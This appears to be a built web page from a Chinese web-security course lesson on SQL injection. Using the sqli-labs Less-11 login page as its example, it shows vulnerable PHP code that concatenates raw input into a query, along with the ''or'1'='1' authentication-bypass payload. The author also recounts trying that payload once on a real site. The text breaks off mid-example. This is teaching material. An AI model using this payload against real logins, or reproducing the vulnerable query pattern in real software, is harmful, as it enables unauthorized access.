import{_ as o,D as e,o as t,g as c,J as l,h as s,Q as p,m as n}from"./chunks/framework.f67d7268.js";const x=JSON.parse('{"title":"06SQL注入：小心数据库被拖走（上）","description":"","frontmatter":{},"headers":[],"relativePath":"posts/devops/Web 安全攻防之道_文档/(5974) 06  SQL 注入：小心数据库被拖走（上）.md","filePath":"posts/devops/Web 安全攻防之道_文档/(5974) 06  SQL 注入：小心数据库被拖走（上）.md","lastUpdated":1696682708000}'),r={name:"posts/devops/Web 安全攻防之道_文档/(5974) 06  SQL 注入：小心数据库被拖走（上）.md"},E=p('<h1 id="_06sql注入-小心数据库被拖走-上" tabindex="-1">06SQL注入：小心数据库被拖走（上） <a class="header-anchor" href="#_06sql注入-小心数据库被拖走-上" aria-label="Permalink to &quot;06SQL注入：小心数据库被拖走（上）&quot;">​</a></h1><p>你好，我是赢少良。我们现在来到了 SQL 注入的学习，这里我会主要介绍 SQL 注入漏洞的产生原理、利用、检测和防御。相信学完后，你就知道：</p><ul><li><p>为什么 &#39;or&#39;1&#39;=&#39;1 是个万能密码；</p></li><li><p>攻击者会如何进一步利用漏洞发动攻击窃取数据库；</p></li><li><p>开发如何检测和防御 SQL 注入漏洞。</p></li></ul><p>这一讲，我主要讲解 SQL 注入与数据库拖库问题。</p><p>十几年前，我在网上偶然间看到一篇文章，号称有可登录任意网站管理后台的万能密码，只要在用户名和密码中均输入 &#39;or&#39;1&#39;=&#39;1（注意单引号的使用）即可登录后台。当时感觉特别神奇，也有点质疑，于是，我通过 Google 搜索了几个网站后台，没想到有一个真的登录进去了，还可以直接修改主页内容。我没有动，给管理员留言后就退出了。</p><p>后来，从网友那得知有个叫&quot;明小子&quot;的工具，专门用于检测和利用 SQL 注入漏洞，使用起来非常&quot;傻瓜&quot;。如果你很早接触过安全，相信对下面的界面图再熟悉不过了。这是我第一次听说&quot;SQL 注入&quot;这个词，知道了它属于 Web 漏洞中非常常见的一种漏洞。</p>',6),y=p(`<p>图 1：&quot;明小子&quot;工具</p><p>目前 PHP + MySQL + Linux 一直是网站搭建的主流环境，我们也是在此环境下演示的。其他数据库系统不再介绍，你可自行搜索相关资料拓展学习。同时，为了简化环境搭建的工作，推荐使用 Docker 安装 sqli-labs 作为靶场来实践，具体安装方法可参考《<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=585&amp;decorateId=396aca4423074fd39a878fc22e9ae663&amp;_channel_track_key=IIxiTicP#/detail/pc?id=5970" target="_blank" rel="noreferrer">03 | 靶场：搭建漏洞练习环境</a>》中的内容。</p><h3 id="sql-注入产生的原因" tabindex="-1">SQL 注入产生的原因 <a class="header-anchor" href="#sql-注入产生的原因" aria-label="Permalink to &quot;SQL 注入产生的原因&quot;">​</a></h3><p>以 sqli-labs 第 11 题为例，该题模拟后台登录页面，其 Username 与 Password 均存在 SQL 注入漏洞。该题的 PHP 源码可直接点击 <a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-11" target="_blank" rel="noreferrer">Github 链接</a>查看，也可以进 Docker 容器内查看。</p><p>为方便理解，我把 PHP 源码贴出来，并加上了注释：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">//including the Mysql connect parameters.</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">include</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;../sql-connections/sql-connect.php&quot;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#79B8FF;">error_reporting</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">// take the variables</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">isset</span><span style="color:#E1E4E8;">($_POST[</span><span style="color:#9ECBFF;">&#39;uname&#39;</span><span style="color:#E1E4E8;">]) </span><span style="color:#F97583;">&amp;&amp;</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">isset</span><span style="color:#E1E4E8;">($_POST[</span><span style="color:#9ECBFF;">&#39;passwd&#39;</span><span style="color:#E1E4E8;">]))</span></span>
<span class="line"><span style="color:#E1E4E8;">	{</span></span>
<span class="line"><span style="color:#E1E4E8;">		$uname</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$_POST[</span><span style="color:#9ECBFF;">&#39;uname&#39;</span><span style="color:#E1E4E8;">];    </span><span style="color:#6A737D;">// 用户输入的用户名</span></span>
<span class="line"><span style="color:#E1E4E8;">		$passwd</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$_POST[</span><span style="color:#9ECBFF;">&#39;passwd&#39;</span><span style="color:#E1E4E8;">];  </span><span style="color:#6A737D;">// 用户输入的密码</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span><span style="color:#6A737D;">//logging the connection parameters to a file for analysis.</span></span>
<span class="line"><span style="color:#E1E4E8;">		$fp</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">fopen</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;result.txt&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span><span style="color:#79B8FF;">fwrite</span><span style="color:#E1E4E8;">($fp,</span><span style="color:#9ECBFF;">&#39;User Name:&#39;</span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;">$uname);</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span><span style="color:#79B8FF;">fwrite</span><span style="color:#E1E4E8;">($fp,</span><span style="color:#9ECBFF;">&#39;Password:&#39;</span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;">$passwd</span><span style="color:#F97583;">.</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">\\n</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span><span style="color:#79B8FF;">fclose</span><span style="color:#E1E4E8;">($fp);</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span><span style="color:#6A737D;">// connectivity </span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#6A737D;">// 未经过滤，直接将用户输入带入 SQL 语句进行查询，最终导致 SQL 注入</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span><span style="color:#F97583;">@</span><span style="color:#E1E4E8;">$sql</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#F97583;">SELECT</span><span style="color:#9ECBFF;"> username, </span><span style="color:#F97583;">password</span><span style="color:#9ECBFF;"> </span><span style="color:#F97583;">FROM</span><span style="color:#9ECBFF;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#9ECBFF;"> username</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;</span><span style="color:#E1E4E8;">$uname</span><span style="color:#9ECBFF;">&#39; </span><span style="color:#F97583;">and</span><span style="color:#9ECBFF;"> </span><span style="color:#F97583;">password=</span><span style="color:#9ECBFF;">&#39;</span><span style="color:#E1E4E8;">$passwd</span><span style="color:#9ECBFF;">&#39; </span><span style="color:#F97583;">LIMIT</span><span style="color:#9ECBFF;"> </span><span style="color:#79B8FF;">0</span><span style="color:#9ECBFF;">,</span><span style="color:#79B8FF;">1</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">		$result</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">mysql_query</span><span style="color:#E1E4E8;">($sql);</span></span>
<span class="line"><span style="color:#E1E4E8;">		$row </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">mysql_fetch_array</span><span style="color:#E1E4E8;">($result);</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">($row)</span></span>
<span class="line"><span style="color:#E1E4E8;">		{</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#6A737D;">// 查询到数据就登录成功</span></span>
<span class="line"><span style="color:#E1E4E8;">	  		</span><span style="color:#6A737D;">//echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;			</span></span>
<span class="line"><span style="color:#E1E4E8;">	  		</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#6A737D;">//echo &quot; You Have successfully logged in\\n\\n &quot; ;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#39;</span><span style="color:#E1E4E8;">;	</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;Your Login name:&#39;</span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;"> $row[</span><span style="color:#9ECBFF;">&#39;username&#39;</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;Your Password:&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;">$row[</span><span style="color:#9ECBFF;">&#39;password&#39;</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;/font&gt;&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#39;</span><span style="color:#E1E4E8;">;	</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span></span>
<span class="line"><span style="color:#E1E4E8;">	  		</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;/font&gt;&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">	  	}</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span><span style="color:#F97583;">else</span></span>
<span class="line"><span style="color:#E1E4E8;">		{</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#6A737D;">// 登录失败</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#6A737D;">//echo &quot;Try again looser&quot;;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">print_r</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">mysql_error</span><span style="color:#E1E4E8;">());</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;/br&gt;&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;/br&gt;&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;/br&gt;&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;</span><span style="color:#E1E4E8;">;	</span></span>
<span class="line"><span style="color:#E1E4E8;">			</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;/font&gt;&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">		}</span></span>
<span class="line"><span style="color:#E1E4E8;">	}</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">//including the Mysql connect parameters.</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">include</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;../sql-connections/sql-connect.php&quot;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#005CC5;">error_reporting</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">	</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">// take the variables</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">if</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">isset</span><span style="color:#24292E;">($_POST[</span><span style="color:#032F62;">&#39;uname&#39;</span><span style="color:#24292E;">]) </span><span style="color:#D73A49;">&amp;&amp;</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">isset</span><span style="color:#24292E;">($_POST[</span><span style="color:#032F62;">&#39;passwd&#39;</span><span style="color:#24292E;">]))</span></span>
<span class="line"><span style="color:#24292E;">	{</span></span>
<span class="line"><span style="color:#24292E;">		$uname</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$_POST[</span><span style="color:#032F62;">&#39;uname&#39;</span><span style="color:#24292E;">];    </span><span style="color:#6A737D;">// 用户输入的用户名</span></span>
<span class="line"><span style="color:#24292E;">		$passwd</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$_POST[</span><span style="color:#032F62;">&#39;passwd&#39;</span><span style="color:#24292E;">];  </span><span style="color:#6A737D;">// 用户输入的密码</span></span>
<span class="line"><span style="color:#24292E;">		</span><span style="color:#6A737D;">//logging the connection parameters to a file for analysis.</span></span>
<span class="line"><span style="color:#24292E;">		$fp</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">fopen</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;result.txt&#39;</span><span style="color:#24292E;">,</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">		</span><span style="color:#005CC5;">fwrite</span><span style="color:#24292E;">($fp,</span><span style="color:#032F62;">&#39;User Name:&#39;</span><span style="color:#D73A49;">.</span><span style="color:#24292E;">$uname);</span></span>
<span class="line"><span style="color:#24292E;">		</span><span style="color:#005CC5;">fwrite</span><span style="color:#24292E;">($fp,</span><span style="color:#032F62;">&#39;Password:&#39;</span><span style="color:#D73A49;">.</span><span style="color:#24292E;">$passwd</span><span style="color:#D73A49;">.</span><span style="color:#032F62;">&quot;</span><span style="color:#005CC5;">\\n</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">		</span><span style="color:#005CC5;">fclose</span><span style="color:#24292E;">($fp);</span></span>
<span class="line"><span style="color:#24292E;">	</span></span>
<span class="line"><span style="color:#24292E;">		</span><span style="color:#6A737D;">// connectivity </span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6A737D;">// 未经过滤，直接将用户输入带入 SQL 语句进行查询，最终导致 SQL 注入</span></span>
<span class="line"><span style="color:#24292E;">		</span><span style="color:#D73A49;">@</span><span style="color:#24292E;">$sql</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;</span><span style="color:#D73A49;">SELECT</span><span style="color:#032F62;"> username, </span><span style="color:#D73A49;">password</span><span style="color:#032F62;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#032F62;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#032F62;"> username</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;</span><span style="color:#24292E;">$uname</span><span style="color:#032F62;">&#39; </span><span style="color:#D73A49;">and</span><span style="color:#032F62;"> </span><span style="color:#D73A49;">password=</span><span style="color:#032F62;">&#39;</span><span style="color:#24292E;">$passwd</span><span style="color:#032F62;">&#39; </span><span style="color:#D73A49;">LIMIT</span><span style="color:#032F62;"> </span><span style="color:#005CC5;">0</span><span style="color:#032F62;">,</span><span style="color:#005CC5;">1</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">		$result</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">mysql_query</span><span style="color:#24292E;">($sql);</span></span>
<span class="line"><span style="color:#24292E;">		$row </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">mysql_fetch_array</span><span style="color:#24292E;">($result);</span></span>
<span class="line"><span style="color:#24292E;">	</span></span>
<span class="line"><span style="color:#24292E;">		</span><span style="color:#D73A49;">if</span><span style="color:#24292E;">($row)</span></span>
<span class="line"><span style="color:#24292E;">		{</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#6A737D;">// 查询到数据就登录成功</span></span>
<span class="line"><span style="color:#24292E;">	  		</span><span style="color:#6A737D;">//echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;			</span></span>
<span class="line"><span style="color:#24292E;">	  		</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#6A737D;">//echo &quot; You Have successfully logged in\\n\\n &quot; ;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#39;</span><span style="color:#24292E;">;	</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;Your Login name:&#39;</span><span style="color:#D73A49;">.</span><span style="color:#24292E;"> $row[</span><span style="color:#032F62;">&#39;username&#39;</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;Your Password:&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">.</span><span style="color:#24292E;">$row[</span><span style="color:#032F62;">&#39;password&#39;</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;/font&gt;&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#39;</span><span style="color:#24292E;">;	</span></span>
<span class="line"><span style="color:#24292E;">			</span></span>
<span class="line"><span style="color:#24292E;">	  		</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;/font&gt;&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">	  	}</span></span>
<span class="line"><span style="color:#24292E;">		</span><span style="color:#D73A49;">else</span></span>
<span class="line"><span style="color:#24292E;">		{</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#6A737D;">// 登录失败</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#6A737D;">//echo &quot;Try again looser&quot;;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">print_r</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">mysql_error</span><span style="color:#24292E;">());</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;/br&gt;&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;/br&gt;&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;/br&gt;&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;</span><span style="color:#24292E;">;	</span></span>
<span class="line"><span style="color:#24292E;">			</span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;/font&gt;&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">		}</span></span>
<span class="line"><span style="color:#24292E;">	}</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>可以看到，用户在登录框输入的用户名及密码未经过滤就直接传入以下 SQL 语句：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> username, </span><span style="color:#F97583;">password</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> username</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;$uname&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">and</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">password=</span><span style="color:#9ECBFF;">&#39;$passwd&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">LIMIT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">1</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> username, </span><span style="color:#D73A49;">password</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> username</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;$uname&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">and</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">password=</span><span style="color:#032F62;">&#39;$passwd&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">LIMIT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">0</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">1</span></span></code></pre></div><p>如果此时我在 Username 中输入英文单引号，那么 SQL 语句就变成：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> username, </span><span style="color:#F97583;">password</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> username</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;&#39;&#39; and password=&#39;&#39; LIMIT 0,1</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> username, </span><span style="color:#D73A49;">password</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> username</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;&#39;&#39; and password=&#39;&#39; LIMIT 0,1</span></span></code></pre></div><p>这里 username 没有闭合，会导致语法错误：</p><blockquote><p>You have an error in your SQL syntax；check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39; and password=&#39;&#39; LIMIT 0,1&#39; at line 1。</p></blockquote>`,12),F=n("p",null,"图 2：username 没有闭合导致的语法错误",-1),i=n("p",null,"还记得开头提到的万能密码吗？我们输入试试：",-1),C=p(`<p>图 3：输入万能钥匙</p><p>成功登录了！那为什么会这样呢？</p><p>我们先来看下输入万能密码后，SQL 语句的构成：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> username, </span><span style="color:#F97583;">password</span><span 